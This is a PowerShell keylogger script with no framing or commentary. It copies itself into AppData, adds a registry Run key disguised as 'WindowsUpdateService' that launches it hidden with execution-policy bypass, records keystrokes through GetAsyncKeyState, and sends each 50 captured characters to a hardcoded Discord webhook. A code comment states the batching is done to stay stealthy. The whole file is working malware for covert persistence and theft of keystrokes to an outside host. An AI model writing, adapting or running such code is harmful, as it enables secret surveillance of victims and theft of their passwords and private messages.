# Configuration
$WebhookUrl = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
$ProcName = "WindowsUpdateService"
$FilePath = "$env:APPDATA\win_update.ps1"

# 1. Self-Persistence: Copy script to AppData and create Registry Run Key
if ($PSCommandPath -ne $FilePath) {
    Copy-Item -Path $PSCommandPath -Destination $FilePath -Force
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Get-ItemProperty -Path $RegPath -Name $ProcName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $RegPath -Name $ProcName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FilePath`"" -PropertyType String
    }
}

# 2. The Keylogger Engine
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyHook {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$Log = ""
$Machine = $env:COMPUTERNAME

while ($true) {
    Start-Sleep -Milliseconds 100
    for ($i = 8; $i -le 190; $i++) {
        $State = [KeyHook]::GetAsyncKeyState($i)
        if ($State -eq -32767) {
            $Key = [char]$i
            $Log += $Key
            
            # Send to Discord every 50 characters to keep it stealthy but consistent
            if ($Log.Length -ge 50) {
                $Payload = @{
                    username = $Machine
                    content = "Captured: $Log"
                } | ConvertTo-Json
                
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json"
                $Log = ""
            }
        }
    }
}
